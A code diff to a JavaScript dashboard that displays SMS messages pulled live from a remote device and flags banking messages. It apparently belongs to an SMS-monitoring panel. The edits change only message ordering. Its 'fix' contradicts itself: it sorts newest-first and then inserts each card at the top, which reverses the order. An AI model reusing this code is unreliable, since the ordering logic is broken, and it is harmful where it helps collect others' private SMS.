@@ -3196,10 +3196,12 @@ async function loadDeviceMessages() {
       
       console.log('📱 Device Messages:', deviceMessages.length);
       
+      // =================== IMPORTANT FIX ===================
+      // Sorting - Newest first (top mein)
       deviceMessages.sort((a, b) => {
         const timeA = getTimestampFromSms(a);
         const timeB = getTimestampFromSms(b);
-        return timeB - timeA;
+        return timeB - timeA;  // Newest first (top mein)
       });
       
       allSmsData = deviceMessages;
@@ -3248,6 +3250,9 @@ function renderDeviceMessages(messages) {
   
   loadingMessages.style.display = 'none';
   
+  // =================== IMPORTANT FIX ===================
+  // Clear the container and add messages in order
+  deviceMessagesList.innerHTML = '';
   messages.forEach(message => {
     addMessageCard(message);
   });
@@ -3366,7 +3371,9 @@ function addMessageCard(message) {
     });
   }
   
-  container.appendChild(card);
+  // =================== IMPORTANT FIX ===================
+  // Insert at the TOP (beginning) of container
+  container.insertBefore(card, container.firstChild);
 }
 
 function isBankingMessage(text) {
@@ -4162,6 +4169,8 @@ function renderHistory() {
   });
 }
 
+// ===================== MOST IMPORTANT FIX =====================
+// Handle Live SMS - SMS ko TOP mein add karna
 function handleLiveSMS(data) {
   if (!data || !data.data || data.uid !== DEVICE_ID) return;
   
@@ -4186,12 +4195,15 @@ function handleLiveSMS(data) {
   
   const exists = allSmsData.some(sms => sms.id === smsId);
   if (!exists) {
+    // =================== IMPORTANT FIX ===================
+    // TOP mein add karo (unshift) - messages.html ki tarah
     allSmsData.unshift(newSms);
     
+    // Sorting maintain karo - newest top mein
     allSmsData.sort((a, b) => {
       const timeA = getTimestampFromSms(a);
       const timeB = getTimestampFromSms(b);
-      return timeB - timeA;
+      return timeB - timeA;  // Newest first (top mein)
     });
     
     liveSmsCount++;
@@ -4199,8 +4211,8 @@ function handleLiveSMS(data) {
   
   updateNotificationBadge(liveSmsCount);
   
-  deviceMessagesList.innerHTML = '';
-  allSmsData.forEach(msg => addMessageCard(msg));
+  // Clear and re-render messages from scratch
+  renderDeviceMessages(allSmsData);
   
   showToast(`📩 New SMS from ${newSms.from}`, 'live');
   
